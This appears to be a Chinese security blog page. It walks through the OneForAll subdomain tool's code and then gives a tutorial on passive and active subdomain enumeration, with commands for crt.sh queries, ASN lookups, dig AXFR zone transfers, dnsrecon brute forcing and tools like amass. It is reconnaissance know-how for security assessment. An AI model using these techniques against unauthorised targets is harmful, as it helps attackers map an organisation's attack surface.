name = f&#x27;all_subdomain_result_&#123;timestamp&#125;&#x27; export_all_results(path, name, fmt, datas) export_all_subdomains(alive, path, name, datas) 123456789101112131415def export_all_results(path, name, fmt, datas): path = check_path(path, name, fmt) logger.log(&#x27;ALERT&#x27;, f&#x27;The subdomain result for all main domains: &#123;path&#125;&#x27;) row_list = list() for row in datas: if &#x27;header&#x27; in row: row.pop(&#x27;header&#x27;) if &#x27;response&#x27; in row: row.pop(&#x27;response&#x27;) keys = row.keys() values = row.values() row_list.append(Record(keys, values)) rows = RecordCollection(iter(row_list)) //!!! content = rows.export(fmt) save_to_file(path, content) 1234567891011121314def export_all_subdomains(alive, path, name, datas): path = check_path(path, name, &#x27;txt&#x27;) logger.log(&#x27;ALERT&#x27;, f&#x27;The txt subdomain result for all main domains: &#123;path&#125;&#x27;) subdomains = set() for row in datas: subdomain = row.get(&#x27;subdomain&#x27;) if alive: if not row.get(&#x27;alive&#x27;): continue subdomains.add(subdomain) else: subdomains.add(subdomain) data = &#x27;\\n&#x27;.join(subdomains) save_to_file(path, data) self.data = utils.get_data(self.domain) 12345def get_data(domain): db = Database() data = db.get_data(domain).as_dict() # !!! db.close() return data db.get_data(domain) 123456789def get_data(self, table_name): &quot;&quot;&quot; Get all the data in the table :param str table_name: table name &quot;&quot;&quot; table_name = table_name.replace(&#x27;.&#x27;, &#x27;_&#x27;) logger.log(&#x27;TRACE&#x27;, f&#x27;Get all the data from &#123;table_name&#125; table&#x27;) return self.query(f&#x27;select * from &quot;&#123;table_name&#125;&quot;&#x27;) as_dict() 12def as_dict(self, ordered=False): return self.all(as_dict=not (ordered), as_ordereddict=ordered) 1234567891011121314def all(self, as_dict=False, as_ordereddict=False): &quot;&quot;&quot;Returns a list of all rows for the RecordCollection. If they haven&#x27;t been fetched yet, consume the iterator and cache the results.&quot;&quot;&quot; # By calling list it calls the __iter__ method rows = list(self) if as_dict: return [r.as_dict() for r in rows] elif as_ordereddict: return [r.as_dict(ordered=True) for r in rows] return rows# OrderedDict迭代器 utils.clear_data(self.domain) 123456def clear_data(domain): db = Database() db.drop_table(domain) db.close() # 删除表 # 此时表里的数据未进行resolve, http req, 前面由get_data取出了再删除 0x2.2.7 DNS解析验证12self.data &#x3D; resolve.run_resolve(self.domain, self.data)resolve.save_db(self.domain, self.data) 12345678910111213141516171819202122232425262728293031323334353637383940def run_resolve(domain, data): &quot;&quot;&quot; 调用子域解析入口函数 :param str domain: 待解析的主域 :param list data: 待解析的子域数据列表 :return: 解析得到的结果列表 :rtype: list &quot;&quot;&quot; logger.log(&#x27;INFOR&#x27;, f&#x27;Start resolving subdomains of &#123;domain&#125;&#x27;) subdomains = filter_subdomain(data) if not subdomains: return data massdns_dir = settings.third_party_dir.joinpath(&#x27;massdns&#x27;) result_dir = settings.result_save_dir temp_dir = result_dir.joinpath(&#x27;temp&#x27;) utils.check_dir(temp_dir) massdns_path = utils.get_massdns_path(massdns_dir) timestring = utils.get_timestring() save_name = f&#x27;collected_subdomains_&#123;domain&#125;_&#123;timestring&#125;.txt&#x27; save_path = temp_dir.joinpath(save_name) save_subdomains(save_path, subdomains) del subdomains gc.collect() output_name = f&#x27;resolved_result_&#123;domain&#125;_&#123;timestring&#125;.json&#x27; output_path = temp_dir.joinpath(output_name) log_path = result_dir.joinpath(&#x27;massdns.log&#x27;) ns_path = utils.get_ns_path() logger.log(&#x27;INFOR&#x27;, f&#x27;Running massdns to resolve subdomains&#x27;) utils.call_massdns(massdns_path, save_path, ns_path, output_path, log_path, quiet_mode=True) infos = deal_output(output_path) data = update_data(data, infos) logger.log(&#x27;INFOR&#x27;, f&#x27;Finished resolve subdomains of &#123;domain&#125;&#x27;) return data 1call_massdns 1234567891011121314151617181920def call_massdns(massdns_path, dict_path, ns_path, output_path, log_path, query_type=&#x27;A&#x27;, process_num=1, concurrent_num=10000, quiet_mode=False): logger.log(&#x27;DEBUG&#x27;, &#x27;Start running massdns&#x27;) quiet = &#x27;&#x27; if quiet_mode: quiet = &#x27;--quiet&#x27; status_format = settings.brute_status_format socket_num = settings.brute_socket_num resolve_num = settings.brute_resolve_num cmd = f&#x27;&#123;massdns_path&#125; &#123;quiet&#125; --status-format &#123;status_format&#125; &#x27; \\ f&#x27;--processes &#123;process_num&#125; --socket-count &#123;socket_num&#125; &#x27; \\ f&#x27;--hashmap-size &#123;concurrent_num&#125; --resolvers &#123;ns_path&#125; &#x27; \\ f&#x27;--resolve-count &#123;resolve_num&#125; --type &#123;query_type&#125; &#x27; \\ f&#x27;--flush --output J --outfile &#123;output_path&#125; &#x27; \\ f&#x27;--root --error-log &#123;log_path&#125; &#123;dict_path&#125; --filter OK &#x27; \\ f&#x27;--sndbuf 0 --rcvbuf 0&#x27; logger.log(&#x27;DEBUG&#x27;, f&#x27;Run command &#123;cmd&#125;&#x27;) subprocess.run(args=cmd, shell=True) logger.log(&#x27;DEBUG&#x27;, f&#x27;Finished massdns&#x27;) resolve.save_db(self.domain, self.data) 123456789def save_db(name, data): &quot;&quot;&quot; Save resolved results to database :param str name: table name :param list data: data to be saved &quot;&quot;&quot; logger.log(&#x27;INFOR&#x27;, f&#x27;Saving resolved results&#x27;) utils.save_to_db(name, data, &#x27;resolve&#x27;) // !!! 12345678910111213def save_to_db(name, data, module): &quot;&quot;&quot; Save request results to database :param str name: table name :param list data: data to be saved :param str module: module name &quot;&quot;&quot; db = Database() db.drop_table(name) db.create_table(name) db.save_db(name, data, module) db.close() 1234567891011if not self.req: # 如果没有req self.data = self.export_data() self.datas.extend(self.data) return self.data # 跟前面相同if self.enable_wildcard: # 如果有泛解析 # deal wildcard self.data = wildcard.deal_wildcard(self.data)# HTTP requestutils.clear_data(self.domain)request.run_request(self.domain, self.data, self.port) self.data = wildcard.deal_wildcard(self.data) 12345678910def deal_wildcard(data): new_data = list() appear_times = stat_times(data) for info in data: subdomain = info.get(&#x27;subdomain&#x27;) isvalid, reason = check_valid_subdomain(appear_times, info) logger.log(&#x27;DEBUG&#x27;, f&#x27;&#123;subdomain&#125; is &#123;isvalid&#125; subdomain reason because &#123;reason&#125;&#x27;) if isvalid: new_data.append(info) # !!! return new_data 0x2.2.8 http请求验证模块12utils.clear_data(self.domain) # 跟上一样request.run_request(self.domain, self.data, self.port) # 跑req，更新数据 12345678910111213141516def run_request(domain, data, port): &quot;&quot;&quot; HTTP request entrance :param str domain: domain to be requested :param list data: subdomains data to be requested :param any port: range of ports to be requested :return list: result &quot;&quot;&quot; logger.log(&#x27;INFOR&#x27;, f&#x27;Start requesting subdomains of &#123;domain&#125;&#x27;) data = utils.set_id_none(data) ports = get_port_seq(port) req_data, req_urls = gen_req_data(data, ports) bulk_request(domain, req_data) count = utils.count_alive(domain) logger.log(&#x27;INFOR&#x27;, f&#x27;Found that &#123;domain&#125; has &#123;count&#125; alive subdomains&#x27;) 1234567891011121314151617181920212223242526272829303132def bulk_request(domain, req_data, ret=False): logger.log(&#x27;INFOR&#x27;, &#x27;Requesting urls in bulk&#x27;) resp_queue = Queue() urls_queue = Queue() task_count = len(req_data) for index, info in enumerate(req_data): url = info.get(&#x27;url&#x27;) urls_queue.put((index, url)) session = get_session() thread_count = req_thread_count() if task_count &lt;= thread_count: # 如果请求任务数很小不用创建很多线程了 thread_count = task_count bar = get_progress_bar(task_count) progress_thread = Thread(target=progress, name=&#x27;ProgressThread&#x27;, args=(bar, task_count, urls_queue), daemon=True) progress_thread.start() for i in range(thread_count): request_thread = Thread(target=request, name=f&#x27;RequestThread-&#123;i&#125;&#x27;, args=(urls_queue, resp_queue, session), daemon=True) request_thread.start() if ret: urls_queue.join() return resp_queue save_thread = Thread(target=save, name=f&#x27;SaveThread&#x27;, args=(domain, task_count, req_data, resp_queue), daemon=True) save_thread.start() urls_queue.join() save_thread.join() 0x2.2.9 爬取解析模块1234# Finder moduleif settings.enable_finder_module: finder = Finder() finder.run(self.domain, self.data, self.port) 12345678910111213def run(self, domain, data, port): logger.log(&#x27;INFOR&#x27;, f&#x27;Start Finder module&#x27;) existing_subdomains = set(map(lambda x: x.get(&#x27;subdomain&#x27;), data)) # 已有的子域 found_subdomains = find_subdomains(domain, data) # !!! 主要功能在此函数 new_subdomains = found_subdomains - existing_subdomains if not len(new_subdomains): self.finish() # 未发现新的子域就直接返回 self.subdomains = new_subdomains self.finish() self.gen_result() resolved_data = resolve.run_resolve(domain, self.results) request.run_request(domain, resolved_data, port)# https://github.com/GerbenJavado/LinkFinder 1234567891011121314151617181920212223242526def find_subdomains(domain, data): subdomains = set() js_urls = set() db = Database() for infos in data: jump_history = infos.get(&#x27;history&#x27;) req_url = infos.get(&#x27;url&#x27;) subdomains.update(find_in_history(domain, req_url, jump_history)) # URL跳转历史中查找子域名 rsp_html = db.get_resp_by_url(domain, req_url) if not rsp_html: logger.log(&#x27;DEBUG&#x27;, f&#x27;an abnormal response occurred in the request &#123;req_url&#125;&#x27;) continue subdomains.update(find_in_resp(domain, req_url, rsp_html)) # 返回内容种查找子域名 js_urls.update(find_js_urls(domain, req_url, rsp_html)) # js中查找子域名 req_data = convert_to_dict(js_urls) resp_data = request.bulk_request(domain, req_data, ret=True) while not resp_data.empty(): _, resp = resp_data.get() if not isinstance(resp, Response): continue text = utils.decode_resp_text(resp) subdomains.update(find_in_resp(domain, resp.url, text)) return subdomains 123def find_in_history(domain, url, history): logger.log(&#x27;TRACE&#x27;, f&#x27;matching subdomains from history of &#123;url&#125;&#x27;) return match_subdomains(domain, history) URL跳转历史中查找子域名，通过match_subdomains匹配 def find_in_resp(domain, url, html): logger.log(&#39;TRACE&#39;, f&#39;matching subdomains from response of &#123;url&#125;&#39;) return match_subdomains(domain, html) 1234567891011121314- 从返回内容种查找子域名- &#96;&#96;&#96;python def find_js_urls(domain, req_url, rsp_html): js_urls &#x3D; set() new_urls &#x3D; find_new_urls(rsp_html) if not new_urls: return js_urls for rel_url in new_urls: url &#x3D; convert_url(req_url, rel_url) if not filter_url(domain, url): js_urls.add(url) return js_urls 从js中查找子域名 0x2.2.10 子域置换模块12345# altdns moduleif settings.enable_altdns_module: altdns = Altdns(self.domain) altdns.run(self.data, self.port)# 根据已有的子域，使用子域替换技术再次发现新的子域 123456789101112131415def run(self, data, port): logger.log(&#x27;INFOR&#x27;, f&#x27;Start altdns module&#x27;) self.now_subdomains = utils.get_subdomains(data) self.get_words() self.extract_words() self.gen_new_subdomains() self.subdomains = self.new_subdomains - self.now_subdomains count = len(self.subdomains) logger.log(&#x27;INFOR&#x27;, f&#x27;The altdns module generated &#123;count&#125; new subdomains&#x27;) self.end = time.time() self.elapse = round(self.end - self.start, 1) self.gen_result() resolved_data = resolve.run_resolve(self.domain, self.results) valid_data = wildcard.deal_wildcard(resolved_data) # 强制开启泛解析处理 request.run_request(self.domain, valid_data, port) 123self.get_words() # 得到words,words来源./data/altdns_wordlist.txtself.extract_words() # 根据目标的域命名约定扩展字典self.gen_new_subdomains() 12345678def get_words(self): path = settings.data_storage_dir.joinpath(&#x27;altdns_wordlist.txt&#x27;) with open(path) as fd: for line in fd: word = line.lower().strip() if word: self.words.add(word) # 读取altdns_wordlist.txt内容, 生成words元组 1234567891011121314def extract_words(self): &quot;&quot;&quot; Extend the dictionary based on target&#x27;s domain naming conventions &quot;&quot;&quot; for subdomain in self.now_subdomains: _, parts = split_domain(subdomain) tokens = set(itertools.chain(*[word.lower().split(&#x27;-&#x27;) for word in parts])) tokens = tokens.union(&#123;word.lower() for word in parts&#125;) for token in tokens: if len(token) &gt;= self.wordlen: self.words.add(token) # 从上面收集的数据中，得到words # eg: xiaotao.tao.com -&gt; token=xiaotao 123456789101112131415161718192021222324252627282930313233def gen_new_subdomains(self): for subdomain in self.now_subdomains: subname, parts = split_domain(subdomain) subnames = subname.split(&#x27;.&#x27;) if settings.altdns_increase_num: self.increase_num(subname) # test.1.foo.example.com -&gt; test.2.foo.example.com, test.3.foo.example.com, ... # test1.example.com -&gt; test2.example.com, test3.example.com, ... # test01.example.com -&gt; test02.example.com, test03.example.com, ... if settings.altdns_decrease_num: self.decrease_num(subname) # test.4.foo.example.com -&gt; test.3.foo.example.com, test.2.foo.example.com, ... # test4.example.com -&gt; test3.example.com, test2.example.com, ... # test04.example.com -&gt; test03.example.com, test02.example.com, ... if settings.altdns_replace_word: self.replace_word(subname) # WORD1.1.foo.example.com -&gt; WORD2.1.foo.example.com, # WORD3.1.foo.example.com, # WORD4.1.foo.example.com, # .. if settings.altdns_insert_word: self.insert_word(parts) # test.1.foo.example.com -&gt; WORD.test.1.foo.example.com, # test.WORD.1.foo.example.com, # test.1.WORD.foo.example.com, # test.1.foo.WORD.example.com, # ... if settings.altdns_add_word: self.add_word(subnames) # Prepend with `-` # test.1.foo.example.com -&gt; WORD-test.1.foo.example.com # Prepend with `-` # test.1.foo.example.com -&gt; test-WORD.1.foo.example.com 5种置换方式, 具体规则如上面代码注释 1234......resolved_data &#x3D; resolve.run_resolve(self.domain, self.results) valid_data &#x3D; wildcard.deal_wildcard(resolved_data) # 强制开启泛解析处理 request.run_request(self.domain, valid_data, port) 对生成的子域名，该模块会对其进行dns验证解析和http请求，利用的原理跟上面一样 0x2.2.11 丰富结果12345# Information enrichment moduleif settings.enable_enrich_module: enrich = Enrich(self.domain) enrich.run() # 对结果信息进行丰富 public、cidr、asn、org、addr、isp等内容，丰富更新数据库结果，不进行域名收集 123456public: 是否是公网IPcidr: ip2location库查询出的CIDRasn: ip2location库查询出的ASNorg: addr:ip2region库查询出的物理地址isp: ip2region库查询出的网络服务提供商 0x2.2.12 导出数据至csv文件12self.data = self.export_data() # 导出数据至csv文件self.datas.extend(self.data) 前面提及过export_data函数，于上面一样 0x2.2.13 子域名接管扫描模块123456# Scan subdomain takeoverif self.takeover: subdomains = utils.get_subdomains(self.data) takeover = Takeover(targets=subdomains) takeover.run()# 扫描检测是否存在子域名接管漏洞 1234567891011121314151617181920212223242526272829303132333435363738def run(self): start = time.time() logger.log(&#x27;INFOR&#x27;, f&#x27;Start running &#123;self.source&#125; module&#x27;) if isinstance(self.targets, set): self.subdomains = self.targets else: self.subdomains = utils.get_domains(self.target, self.targets) self.fmt = utils.check_format(self.fmt) timestamp = utils.get_timestamp() name = f&#x27;takeover_check_result_&#123;timestamp&#125;&#x27; self.path = utils.check_path(self.path, name, self.fmt) if self.subdomains: logger.log(&#x27;INFOR&#x27;, f&#x27;Checking subdomain takeover&#x27;) self.fingerprints = get_fingerprint() self.results.headers = [&#x27;subdomain&#x27;, &#x27;cname&#x27;] # 创建待检查的子域队列 for domain in self.subdomains: self.queue.put(domain) # 进度线程 progress_thread = Thread(target=self.progress, name=&#x27;ProgressThread&#x27;, daemon=True) progress_thread.start() # 检查线程 for i in range(self.thread): check_thread = Thread(target=self.check, name=f&#x27;CheckThread&#123;i&#125;&#x27;, daemon=True) check_thread.start() self.queue.join() self.save() else: logger.log(&#x27;FATAL&#x27;, f&#x27;Failed to obtain domain&#x27;) end = time.time() elapse = round(end - start, 1) logger.log(&#x27;ALERT&#x27;, f&#x27;&#123;self.source&#125; module takes &#123;elapse&#125; seconds, &#x27; f&#x27;There are &#123;len(self.results)&#125; subdomains exists takeover&#x27;) logger.log(&#x27;INFOR&#x27;, f&#x27;Subdomain takeover results: &#123;self.path&#125;&#x27;) logger.log(&#x27;INFOR&#x27;, f&#x27;Finished &#123;self.source&#125; module&#x27;) 具体参考：https://www.hackerone.com/application-security/guide-subdomain-takeovers 1return self.data 0x3 总结​ 看到这里，如果你仔细跟看几遍，那么你会明白的！最后，结合自己的需求进行二开，才是最好的利器！！","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"安全开发","slug":"web安全/安全开发","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"安全工具","slug":"安全工具","permalink":"https://taonn.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"子域名枚举&收集","slug":"子域名枚举-收集","date":"2021-08-03T15:03:41.000Z","updated":"2021-08-03T15:04:41.183Z","comments":true,"path":"2021/08/03/子域名枚举-收集/","link":"","permalink":"https://taonn.github.io/2021/08/03/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE-%E6%94%B6%E9%9B%86/","excerpt":"","text":"引言：信息收集 –&gt; 特此整理 (译文扩展整理) 1. what &amp; why什么是子域名枚举？ ​ 子域名枚举是为一个或多个域名查找子域名的过程，它是安全评估和渗透测试前期侦查和信息收集的重要手段。 为什么要子域名枚举？ Sub-domain enumeration can reveal a lot of domains/sub-domains that are in scope of a security assessment which in turn increases the chances of finding vulnerabilities 子域枚举可以揭示安全评估范围内的许多域/子域，从而增加发现漏洞的机会 Finding applications running on hidden, forgotten sub-domains may lead to uncovering critical vulnerabilities 查找在隐藏的、被遗忘的子域上运行的应用程序可能会导致发现关键漏洞 Often times the same vulnerabilities tend to be present across different domains/applications of the same organization 通常，相同的漏洞往往存在于同一组织的不同域/应用程序中 2. 被动子域名枚举什么是被动子域名枚举？ Passive sub-domain enumeration is where an attacker/tester gathers sub-domain information without generating any traffic directly between him and the infrastructure managed by the target organization 被动子域枚举是攻击者/测试者收集子域信息而不在他和目标组织管理的基础设施之间直接产生任何流量的地方 The objective is to be stealthy and leave low or no footprint 目标是隐身并留下低足迹或不留下足迹 2.1 证书透明度（Certificate Transparency） Under Certificate Transparency(CT), a Certificate Authority(CA) will have to publish all SSL/TLS certificates they issue in a public log 在证书透明度 (CT) 下，证书颁发机构 (CA) 必须在公共日志中发布他们颁发的所有 SSL/TLS 证书 Anyone can look through the CT logs and find certificates issued for a domain 任何人都可以查看 CT 日志并找到为域颁发的证书 CT allows website users and domain owners to identify mistakenly or worse maliciously issued certificates. This aids domain owners and browser vendors in identifying erring CAs CT 允许网站用户和域所有者识别错误或更糟的恶意颁发的证书。这有助于域所有者和浏览器供应商识别错误的 CA 更多可阅读：https://blog.csdn.net/www_helloworld_com/article/details/90403233 2.1.1 证书透明度（CT）- 开源网络情报角度 Certificate Transparency(CT) logs by design contain all the certificates issued by a participating CA for any given domain. SSL/TLS certificates generally contain domain names, sub-domain names and email addresses. These logs are available publicly and anyone can look through these logs. This makes them a treasure trove of information for attackers. 证书透明度 (CT) 日志按设计包含由参与 CA 为任何给定域颁发的所有证书。 SSL/TLS 证书一般包含域名、子域名和电子邮件地址。这些日志是公开可用的，任何人都可以查看这些日志。这使它们成为攻击者的信息宝库。 By looking through the CT logs an attacker can gather a lot of information about an organization’s infrastructure i.e. internal domains, email addresses in a completely passive manner. 通过查看 CT 日志，攻击者可以以完全被动的方式收集有关组织基础设施（即内部域、电子邮件地址）的大量信息。 2.1.2 搜索 CT logs crtsh：https://crt.sh/ censys：https://censys.io/ facebook：https://developers.facebook.com/tools/ct/ google：https://google.com/transparencyreport/https/ct/ spyse：https://spyse.com/search/certificate certspotter：https://sslmate.com/certspotter/api/ entrust：https://www.entrust.com/ct-search/ 2.1.2.1 crtsh访问https://crt.sh/，输入子域，例如：`example.com` crtsh 也提供了使用https://crt.sh/atom?q=&#123;sub-domain&#125;查询的 RSS 提要 还可以使用PostgreSQL接口来查询数据，shell脚本如下： 123456789#!/bin/sh# Script by Hanno Bock - https://github.com/hannob/tlshelpers/blob/master/getsubdomainquery=&quot;SELECT ci.NAME_VALUE NAME_VALUE FROM certificate_identity ci WHERE ci.NAME_TYPE = &#x27;dNSName&#x27; AND reverse(lower(ci.NAME_VALUE)) LIKE reverse(lower(&#x27;%.$1&#x27;));&quot;echo $query | \\ psql -t -h crt.sh -p 5432 -U guest certwatch | \\ sed -e &#x27;s:^ *::g&#x27; -e &#x27;s:^*\\.::g&#x27; -e &#x27;/^$/d&#x27; | \\ sort -u | sed -e &#x27;s:*.::g&#x27; 无psql命令，使用sudo apt-get install postgresql-client安装psql客户端。 2.1.2.2 censyshttps://search.censys.io/certificates?q=&#123;sub-domain&#125; 枚举脚本：https://github.com/0xbharath/censys-enumeration 2.1.2.3 massdns - 提取唯一的可解析子域 https://github.com/blechschmidt/massdns Massdns 是一个极快的 DNS 解析器，可以在更短的时间内解析大量域名 Massdns 可以与从 CT 日志中提取子域的脚本结合使用，以快速识别唯一的可解析域名 2.2.3 证书透明度（CT）的缺点 Certificate Transparency logs are append only which means once a SSL/TLS certificate is appended to a CT log, there is no way to delete them 证书透明度日志仅附加，这意味着一旦 SSL/TLS 证书附加到 CT 日志，就无法删除它们 The obvious downside of this during recon is that the domain/sub-domain names found in CT Logs maynot exist anymore and thus will not resolve to any valid IP address 侦察期间明显的缺点是在 CT 日志中找到的域/子域名可能不再存在，因此将无法解析为任何有效的 IP 地址 2.2 搜索引擎Search engines like Google and Bing supports various advanced search operators to refine search queries. These operators are often referred to as “Google dorks”. 1site:&#123;sub-domain&#125; 2.2.1 Google 2.2.2 百度 2.2.4 Bing https://help.bing.microsoft.com/#apex/18/en-US/10001/-1 2.2.5 Sogouhttps://www.sogou.com/ 2.2.6 360搜索https://www.so.com/ 2.2.7 Yahoohttp://www.yahoo.com/ 2.2.8 Yandexhttps://www.yandex.ru/ 2.2.9 Exaleadhttps://www.exalead.com/search 2.2.10 Dogpilehttp://www.dogpile.com/ 2.3 DNS aggregatorsThere are a lot of the third party services that will do DNS enumeration on your behalf or they aggregate massive DNS datasets and look through them for sub-domains. 2.3.1 VirusTotalhttps://www.virustotal.com/gui/domain/&#123;sub-domain&#125;/relations https://github.com/appsecco/the-art-of-subdomain-enumeration/blob/master/virustotal_subdomain_enum.py 请求头需添加 X-VT-Anti-Abuse-Header 2.3.2 DNSdumpster https://github.com/PaulSec/API-dnsdumpster.com 2.3.3 Netcrafthttps://searchdns.netcraft.com/?host=&#123;sub-domain&#125; 2.4 ASN发现 查找 ASN 将帮助我们识别域的网络段 使用 dig 或 host 解析给定域的 IP 地址 找到给定 IP 地址的 ASN工具 https://asn.cymru.com/cgi-bin/whois.cgi 查找给定域名的 ASN http://bgp.he.net/ 12curl -s http://ip-api.com/json/220.181.32.148 | jq -r .as# install jq: sudo apt-get install jq 找到的 ASN 号可用于查找域的网络块 我们可以使用高级 WHOIS 查询来查找属于 ASN 的所有 IP 范围 1whois -h whois.radb.net -- &#x27;-i origin AS36459&#x27; | grep -Eo &quot;([0-9.]+)&#123;4&#125;/[0-9]+&quot; | uniq nmap脚本查找ASN https://nmap.org/nsedoc/scripts/targets-asn.html 1nmap --script targets-asn --script-args targets-asn.asn=xxxx 2.5 Subject Alternate Name(SAN)The Subject Alternative Name (SAN) is an extension to the X.509 specification that allows to specify additional host names for a single SSL certificate. 2.5.1 从SAN中提取域名12345sed -ne &#39;s&#x2F;^\\( *\\)Subject:&#x2F;\\1&#x2F;p;&#x2F;X509v3 Subject Alternative Name&#x2F;&#123; N;s&#x2F;^.*\\n&#x2F;&#x2F;;:a;s&#x2F;^\\( *\\)\\(.*\\), &#x2F;\\1\\2\\n\\1&#x2F;;ta;p;q; &#125;&#39; &lt; &lt;( openssl x509 -noout -text -in &lt;( openssl s_client -ign_eof 2&gt;&#x2F;dev&#x2F;null &lt;&lt;&lt;$&#39;HEAD &#x2F; HTTP&#x2F;1.0\\r\\n\\r&#39; \\ -connect baidu.com:443 ) ) 也可以使用python脚本 https://github.com/appsecco/the-art-of-subdomain-enumeration/blob/master/san_subdomain_enum.py 2.6 公共数据There are projects that gather Internet wide scan data and make it available to researchers and the security community. The datasets published by this projects are a treasure trove of sub-domain information. Although finding sub-domains in this massive datasets is like finding a needle in the haystack, it is worth the effort. Following are few public datasets that aggregate information that could be of interest during sub-domain enumeration: Name Description Price Sonar FDNS, RDNS, UDP, TCP, TLS, HTTP, HTTPS scan data FREE Censys.io TCP, TLS, HTTP, HTTPS scan data FREE CT TLS FREE CZDS DNS zone files for “new” global TLDs FREE ARIN American IP registry information (ASN, Org, Net, Poc) FREE CAIDA PFX2AS IPv4 Daily snapshots of ASN to IPv4 mappings FREE CAIDA PFX2AS IPv6 Daily snapshots of ASN to IPv6 mappings FREE US Gov US government domain names FREE UK Gov UK government domain names FREE RIR Delegations Regional IP allocations FREE PremiumDrops DNS zone files for com/net/info/org/biz/xxx/sk/us TLDs $24.95/mo WWWS.io Domains across many TLDs (~198m) $9/mo WhoisXMLAPI.com New domain whois data $109/mo 来源：GitHub - hdm/inetdata: Internet data acquisition 2.6.1 Rapid7 Forward DNS 数据集发现子域参考Forward DNS · rapid7/sonar Wiki · GitHub 1curl -silent https:&#x2F;&#x2F;scans.io&#x2F;data&#x2F;rapid7&#x2F;sonar.fdns_v2&#x2F;20170417-fdns.json.gz | pigz -dc | grep &quot;.baidu.com&quot; | jq 数据文件很大！ 3. 主动子域名什么是主动子域名枚举？ Active sub-domain enumeration is where an attacker/tester gathers sub-domain information by probing the infrastructure managed by the target organization 主动子域枚举是攻击者/测试者通过探测目标组织管理的基础设施来收集子域信息的地方 Sometimes the target organization might have delegated the maintainence of infrastructure to 3rd party and attacker probes the infra maintained by a third party example: nameservers 有时目标组织可能已将基础设施的维护委托给 3rd 方，而攻击者会探测由第三方维护的基础设施，例如：名称服务器 The key characteristic of active enumeration is that it generates traffic that may possibly lead to detection and can point to the attacker/tester 主动枚举的关键特征是它生成的流量可能会导致检测并可以指向攻击者/测试者 3.1 基于字典的枚举3.1.1 Subbrute GitHub - TheRook/subbrute: A DNS meta-query spider that enumerates DNS records, and subdomains. 根据DNS记录查询子域名 安装 1234aptitude install python-dnspythongit clone https://github.com/TheRook/subbrute.gitcd subbrutemake 3.1.2 DNSRecon GitHub - darkoperator/dnsrecon: DNS Enumeration Script DNSRecon 是一个强大的 DNS 枚举工具，它的一个特点是使用预定义的词表进行基于字典的子域枚举。 安装 12345aptitude install dnsrecon # kali# or python3.6+git clone https://github.com/darkoperator/dnsrecon.gitcd dnsreconpip install -r requirements.txt 12# 暴力破解python3.7 dnsrecon.py -d baidu.com -D wordlist.txt -t brt 123# DNSpython3.7 dnsrecon.py -t snoop -D wordlist.txt -n 1.1.1.1# 1.1.1.1 是目标的NS server地址 其他参数选项： --threads 8 # 线程 -n nsserver.com # 使用自定义的解析服务器 输出选项： --db: SQLite 3 文件 --xml: XML 文件 --json: JSON 文件 --csv: CSV 文件 3.2 Permutation scanningPermutation scanning is another interesting technique to identify sub-domains. In this technique, we identify new sub-domains using permutations, alterations and mutations of already known domains/sub-domains. 3.2.1 aultdnsGitHub - infosec-au/altdns: Generates permutations, alterations and mutations of subdomains and then resolves them 安装 12#Version: Python2pip install py-altdns 1altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt 3.3 区域传输区域传输是一种 DNS 事务，其中 DNS 服务器将其区域文件的全部或部分副本传递给另一台 DNS 服务器。 1dig +multi AXFR @ns_server target.com 更多参考： https://www.cnblogs.com/cyjaysun/p/4265245.html https://blog.csdn.net/n5xxxx__zy/article/details/90704865 DNS Zone Transfer | Briskinfosec 3.4 Zone walking DNSSEC DNSSEC provides a layer of security by adding cryptographic signatures to existing DNS records DNSSEC 通过向现有 DNS 记录添加加密签名来提供一层安全性 These signatures are stored alongside common record types like A, AAAA, MX 这些签名与 A、AAAA、MX 等常见记录类型一起存储 3.4.1 DNSSEC - New records Record Purpose RRSIG Contains a cryptographic signature. NSEC and NSEC3 For explicit denial-of-existence of a DNS record DNSKEY Contains a public signing key DS Contains the hash of a DNSKEY record 更多详细内容：https://appsecco.com/books/subdomain-enumeration/active_techniques/zone_walking.html 3.5 DNS 记录3.5.1 CNAME 记录CNAME 代表规范名称。 CNAME 记录可用于将一个名称别名为另一个名称。 CNAME 记录将具有主机名的值。有时，CNAME 会显示组织的子域或显示有关在域上运行的服务类型的信息。 3.5.2 SPF记录参考：OSINT Through Sender Policy Framework (SPF) Records | Rapid7 Blog 3.6 HTTP 标头下的子域枚举 很少有安全头暴露子域名信息。 CSP定义的Content-Security-Policy请求头字段，它允许您创建可信内容来源的白名单，并指示浏览器仅执行或呈现来自这些来源的资源。所以基本上，Content-Security-Policy 标头将列出我们作为攻击者可能感兴趣的一堆来源（域）。有不推荐使用的 CSP 标头形式，它们是 X-Content-Security-Policy 和 X-Webkit-CSP 脚本工具：https://github.com/0xbharath/domains-from-csp 4. 扩展：常见工具4.1 oneforall https://github.com/shmilylty/OneForAll 安装 12345git clone https://github.com/shmilylty/OneForAll.gitcd OneForAll/python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/python3 oneforall.py --help 使用 12python3 oneforall.py --target example.com runpython3 oneforall.py --targets ./example.txt run 4.2 Sublist3r https://github.com/aboul3la/Sublist3r Baidu, Yahoo, Google, Bing, Ask, Netcraft, DNSdumpster, VirusTotal, Threat Crowd, SSL Certificates, PassiveDNS 安装 123git clone https://github.com/aboul3la/Sublist3r.gitcd Subllist3rpip3 install -r requirements.txt 使用 123python3 sublist3r.py -d target.com -o $outfile# 暴力破解python3 sublist3r.py -b -d target.com -o $outfile 其他选项： -p 80,443 # 仅显示开放80,443端口的域名 -e google,yahoo,virustotal # 仅使用google,yahoo,virustotal枚举子域名 4.3 Gobuster https://github.com/OJ/gobuster 安装 1234git clone https:&#x2F;&#x2F;github.com&#x2F;OJ&#x2F;gobuster.gitcd gobuster&#x2F;go get &amp;&amp; go buildgo install 简单使用 1gobuster -m dns -u target.com -w $wordlist 4.4 amass https://github.com/OWASP/Amass 安装 1sudo snap install amass 简单使用 1amass enum -d example.com 4.5 Subfinder https://github.com/subfinder/subfinder VirusTotal, PassiveTotal, SecurityTrails, Censys, Riddler, Shodan, Bruteforce 